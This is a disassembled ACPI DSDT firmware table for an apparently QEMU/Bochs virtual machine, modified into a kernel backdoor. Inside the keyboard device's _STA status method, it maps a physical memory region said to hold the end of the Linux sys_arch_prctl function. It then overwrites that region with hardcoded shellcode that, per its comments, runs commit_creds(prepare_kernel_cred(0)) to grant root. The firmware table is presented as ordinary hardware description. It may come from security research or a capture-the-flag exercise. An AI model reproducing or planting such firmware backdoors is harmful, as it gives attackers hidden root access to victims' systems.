/*
 * Intel ACPI Component Architecture
 * AML/ASL+ Disassembler version 20181031 (64-bit version)
 * Copyright (c) 2000 - 2018 Intel Corporation
 * 
 * Disassembling to symbolic ASL+ operators
 *
 * Disassembly of dsdt.dat, Sat Dec  8 23:41:47 2018
 *
 * Original Table Header:
 *     Signature        "DSDT"
 *     Length           0x00000BD4 (3028)
 *     Revision         0x01 **** 32-bit table (V1), no 64-bit math support
 *     Checksum         0x84
 *     OEM ID           "BOCHS "
 *     OEM Table ID     "BXPCDSDT"
 *     OEM Revision     0x00000001 (1)
 *     Compiler ID      "BXPC"
 *     Compiler Version 0x00000001 (1)
 */
DefinitionBlock ("", "DSDT", 2, "BOCHS ", "BXPCDSDT", 0x00000002)
{
    /*
     * iASL Warning: There were 3 external control methods found during
     * disassembly, but only 0 were resolved (3 unresolved). Additional
     * ACPI tables may be required to properly disassemble the code. This
     * resulting disassembler output file may not compile because the
     * disassembler did not know how many arguments to assign to the
     * unresolved methods. Note: SSDTs can be dynamically loaded at
     * runtime and may or may not be available via the host OS.
     *
     * To specify the tables needed to resolve external control method
     * references, the -e option can be used to specify the filenames.
     * Example iASL invocations:
     *     iasl -e ssdt1.aml ssdt2.aml ssdt3.aml -d dsdt.aml
     *     iasl -e dsdt.aml ssdt2.aml -d ssdt1.aml
     *     iasl -e ssdt*.aml -d dsdt.aml
     *
     * In addition, the -fe option can be used to specify a file containing
     * control method external declarations with the associated method
     * argument counts. Each line of the file must be of the form:
     *     External (<method pathname>, MethodObj, <argument count>)
     * Invocation:
     *     iasl -fe refs.txt -d dsdt.aml
     *
     * The following methods were unresolved and many not compile properly
     * because the disassembler had to guess at the number of arguments
     * required for each:
     */
    External (_SB_.PCI0.PCNT, MethodObj)    // Warning: Unknown method, guessing 0 arguments
    External (CPON, UnknownObj)
    External (MDNR, UnknownObj)
    External (MEJ_, UnknownObj)
    External (MES_, UnknownObj)
    External (MINS, UnknownObj)
    External (MOEV, UnknownObj)
    External (MOSC, UnknownObj)
    External (MPX_, IntObj)
    External (MRBH, IntObj)
    External (MRBL, IntObj)
    External (MRLH, IntObj)
    External (MRLL, IntObj)
    External (MRMV, UnknownObj)
    External (MSEL, UnknownObj)
    External (MTFY, MethodObj)    // Warning: Unknown method, guessing 2 arguments
    External (NTFY, MethodObj)    // Warning: Unknown method, guessing 2 arguments
    External (PRS_, IntObj)

    Scope (_SB)
    {
        Device (PCI0)
        {
            Name (_HID, EisaId ("PNP0A03") /* PCI Bus */)  // _HID: Hardware ID
            Name (_ADR, Zero)  // _ADR: Address
            Name (_UID, One)  // _UID: Unique ID
        }
    }

    Scope (_SB.PCI0)
    {
        Device (PX13)
        {
            Name (_ADR, 0x00010003)  // _ADR: Address
            OperationRegion (P13C, PCI_Config, Zero, 0xFF)
        }
    }

    Scope (_SB.PCI0)
    {
        Device (ISA)
        {
            Name (_ADR, 0x00010000)  // _ADR: Address
            OperationRegion (P40C, PCI_Config, 0x60, 0x04)
            Field (^PX13.P13C, AnyAcc, NoLock, Preserve)
            {
                Offset (0x5F), 
                    ,   7, 
                LPEN,   1, 
                Offset (0x67), 
                    ,   3, 
                CAEN,   1, 
                    ,   3, 
                CBEN,   1
            }

            Name (FDEN, One)
        }
    }

    Scope (_SB.PCI0.ISA)
    {

        /* Overwrite physical memory */
        /* It would modify the epilogue of sys_arch_prctl */
        OperationRegion (BRIE, SystemMemory, 0x1014860, 0x80)
        Field (BRIE, AnyAcc, NoLock, Preserve)
        {
            ARR0, 64, 
            ARR1, 64,
            ARR2, 64,
            ARR3, 64,
            ARR4, 64
        }

        Device (KBD)
        {
            Name (_HID, EisaId ("PNP0303") /* IBM Enhanced Keyboard (101/102-key, PS/2 Mouse) */)  // _HID: Hardware ID
            Method (_STA, 0, NotSerialized)  // _STA: Status
            {
                Store("Backdooring", Debug)
                /* Overwrite to shellcode */
                /* execute commit_creds(prepare_kernel_cred(0)) */
                Store(0xc749ff3148544155, ARR0)
                Store(0xd4ff418104adc0c4, ARR1)
                Store(0xac20c4c749c78948, ARR2)
                Store(0x41c031d4ff418104, ARR3)
                Store(0xc35d5c, ARR4)
                
                Return (0x0F)
            }

            Name (_CRS, ResourceTemplate ()  // _CRS: Current Resource Settings
            {
                IO (Decode16,
                    0x0060,             // Range Minimum
                    0x0060,             // Range Maximum
                    0x01,               // Alignment
                    0x01,               // Length
                    )
                IO (Decode16,
                    0x0064,             // Range Minimum
                    0x0064,             // Range Maximum
                    0x01,               // Alignment
                    0x01,               // Length
                    )
                IRQNoFlags ()
                    {1}
            })
        }
    }
}

